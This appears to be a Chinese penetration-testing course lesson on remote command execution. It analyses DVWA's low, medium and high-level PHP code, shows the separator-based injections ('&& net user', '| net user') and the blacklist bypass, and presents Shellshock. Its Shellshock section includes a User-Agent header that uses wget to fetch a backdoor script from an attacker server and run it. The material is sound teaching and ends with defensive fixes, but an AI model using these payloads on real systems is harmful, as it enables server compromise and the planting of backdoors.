# 经典15年i春秋渗透测试系统化教程 - P39：课时3 远程命令执行-DVWA命令执行代码分析 🎯

![](img/93f1c24ca316f563499556a3df935913_1.png)

![](img/93f1c24ca316f563499556a3df935913_2.png)

![](img/93f1c24ca316f563499556a3df935913_4.png)

在本节课中，我们将要学习远程命令执行漏洞的原理，并通过分析DVWA靶场中不同安全级别的命令执行模块代码，深入理解漏洞的成因、利用方式以及安全防护措施。

---

## 概述

命令执行漏洞是指攻击者能够通过Web应用，在服务器上执行任意系统命令。这是一种危害极大的漏洞。本节我们将以DVWA靶场的“Command Execution”模块为例，分析其低、中、高三个安全级别的代码，学习如何发现、利用此类漏洞，并了解如何编写安全的代码来防御它。

---

## DVWA命令执行模块演示

首先，我们来看一下DVWA靶场中命令执行模块的基本功能。该模块提供了一个输入框，允许用户输入一个IP地址进行Ping测试。

在低安全级别下，输入`127.0.0.1`，页面会正常返回Ping命令的结果。

![](img/93f1c24ca316f563499556a3df935913_6.png)

![](img/93f1c24ca316f563499556a3df935913_8.png)

![](img/93f1c24ca316f563499556a3df935913_1.png)

![](img/93f1c24ca316f563499556a3df935913_10.png)

但是，如果我们尝试输入其他系统命令，例如`net user`，则会执行失败并报错。

![](img/93f1c24ca316f563499556a3df935913_2.png)

---

## 低安全级别代码分析

上一节我们演示了模块的基本功能，本节中我们来看看其背后的代码逻辑，理解为何会出现命令执行漏洞。

以下是低安全级别（`low.php`）的核心代码片段：

```php
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {
    $target = $_REQUEST[ 'ip' ];
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        $cmd = shell_exec( 'ping  ' . $target );
    } else {
        $cmd = shell_exec( 'ping  -c 3 ' . $target );
    }
    echo "<pre>{$cmd}</pre>";
}
?>
```

**代码逻辑分析：**
1.  程序获取用户输入的`ip`参数，直接赋值给`$target`变量。
2.  判断服务器操作系统类型。
3.  拼接字符串，直接使用`shell_exec()`函数执行`ping ` + `$target`这条命令。
4.  将命令执行的结果输出到页面。

**漏洞成因：**
代码没有对用户输入的`$target`变量做任何过滤。攻击者可以输入`127.0.0.1 && net user`，那么最终执行的命令就变成了：
```bash
ping 127.0.0.1 && net user
```
在Windows系统中，`&&`是命令连接符，表示前一条命令执行成功后，则执行后一条命令。因此，服务器会先执行`ping 127.0.0.1`，然后执行`net user`。

![](img/93f1c24ca316f563499556a3df935913_6.png)

除了`&&`，Windows下还可以使用`&`、`||`、`|`等符号来连接多条命令。Linux/Unix系统则常用`;`、`&&`、`||`、`|`、反引号 `` ` `` 等。

---

## 中安全级别代码分析

在了解了低级别的漏洞后，我们来看看中级别的防护措施。中级代码尝试对用户输入进行过滤。

以下是中安全级别（`medium.php`）的过滤代码：

```php
<?php
$target = $_REQUEST[ 'ip' ];
$substitutions = array(
    '&&' => '',
    ';'  => '',
);
$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
?>
```

**防护措施分析：**
代码使用`str_replace`函数，将用户输入中的`&&`和`;`这两个命令连接符替换为空字符串。

**漏洞绕过：**
这种防护属于“黑名单”机制，只过滤了部分符号。攻击者可以使用未被过滤的符号，例如管道符`|`。
-   输入`127.0.0.1 | net user`，最终执行的命令为：
    ```bash
    ping 127.0.0.1 | net user
    ```
    管道符`|`会将前一个命令（`ping`）的输出，作为后一个命令（`net user`）的输入。虽然`ping`的输出对`net user`无意义，但`net user`命令本身会被成功执行。

![](img/93f1c24ca316f563499556a3df935913_10.png)

因此，仅依靠黑名单过滤特定危险字符是不安全的，总可能存在未被考虑的绕过方式。

---

![](img/93f1c24ca316f563499556a3df935913_12.png)

## 高安全级别代码分析

![](img/93f1c24ca316f563499556a3df935913_14.png)

最后，我们学习最安全的高级别防护是如何实现的。高级别采用了“白名单”的防御思想。

![](img/93f1c24ca316f563499556a3df935913_15.png)

![](img/93f1c24ca316f563499556a3df935913_16.png)

以下是高安全级别（`high.php`）的验证代码：

![](img/93f1c24ca316f563499556a3df935913_18.png)

```php
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {
    $target = $_REQUEST[ 'ip' ];
    $octet = explode( ".", $target );
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // 执行ping命令
    } else {
        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
    }
}
?>
```

![](img/93f1c24ca316f563499556a3df935913_19.png)

**防护措施分析：**
1.  使用`explode(“.“, $target)`函数，以点号`.`为分隔符，将输入字符串分割成数组`$octet`。
2.  严格检查这个数组：
    -   数组长度必须为4（IPv4地址的四段）。
    -   每一段都必须是由`is_numeric()`函数验证的数字。

**安全性：**
这种白名单方式严格限定了用户的输入必须是一个合法的IPv4地址格式（如`192.168.1.1`）。任何附加的命令、符号或非数字字符都会导致验证失败。因此，攻击者无法注入任何额外的命令。

![](img/93f1c24ca316f563499556a3df935913_12.png)

---

## 真实漏洞案例：Shellshock (CVE-2014-6271)

除了这种直接的代码漏洞，一些系统组件本身也存在命令执行漏洞。Shellshock（破壳漏洞）就是一个经典的例子。

该漏洞存在于广泛使用的Bash shell环境中。攻击者可以通过构造特殊的环境变量值，在调用Bash时执行任意命令。

**漏洞验证命令：**
在受影响的Linux服务器上执行：
```bash
env x='() { :;}; echo vulnerable' bash -c "echo test"
```
如果输出中包含`vulnerable`，则证明存在该漏洞。

**漏洞利用：**
在Web渗透中，如果CGI脚本调用Bash，攻击者可以通过HTTP请求头（如`User-Agent`）注入恶意代码。
例如，通过Burp Suite抓包并修改请求头：
```
GET /cgi-bin/test.cgi HTTP/1.1
User-Agent: () { :;}; /usr/bin/wget http://攻击者服务器/backdoor.sh -O /tmp/bd.sh; chmod 777 /tmp/bd.sh; /tmp/bd.sh
Host: target.com
```
这个请求会尝试从攻击者服务器下载木马脚本、赋予执行权限并运行。

![](img/93f1c24ca316f563499556a3df935913_18.png)

---

## 修复建议

通过DVWA的代码分析，我们可以总结出防御命令执行漏洞的最佳实践：

1.  **使用白名单，而非黑名单**：严格定义允许输入的格式（如必须是IP地址、文件名），拒绝所有不符合格式的输入。
2.  **对输入进行严格验证和转义**：在将用户输入传递给系统命令函数（如`system()`, `exec()`, `shell_exec()`）前，必须进行过滤。
3.  **避免直接拼接命令**：尽量不要使用用户输入直接拼接系统命令。如果必须，请使用安全的API或函数（如`escapeshellarg()`、`escapeshellcmd()`）来处理参数。
4.  **降低权限**：运行Web服务的进程应使用最低必要的权限，避免使用root或管理员权限。
5.  **及时更新组件**：像Shellshock这类漏洞，需要及时更新系统组件（Bash）到安全版本。

![](img/93f1c24ca316f563499556a3df935913_21.png)

---

## 总结

本节课中我们一起学习了远程命令执行漏洞：
-   **原理**：由于程序将用户输入未经验证地拼接进系统命令中执行。
-   **利用**：通过命令连接符（`&&`, `|`, `;`等）注入恶意命令。
-   **分析**：通过DVWA低、中、高三个级别的代码，理解了黑名单过滤的局限性和白名单验证的重要性。
-   **案例**：了解了Shellshock这类环境相关的命令执行漏洞。
-   **防御**：核心思想是采用白名单进行输入验证，避免用户输入控制命令执行参数。

![](img/93f1c24ca316f563499556a3df935913_23.png)

![](img/93f1c24ca316f563499556a3df935913_24.png)

理解并掌握这些知识，对于进行安全的代码审计和渗透测试至关重要。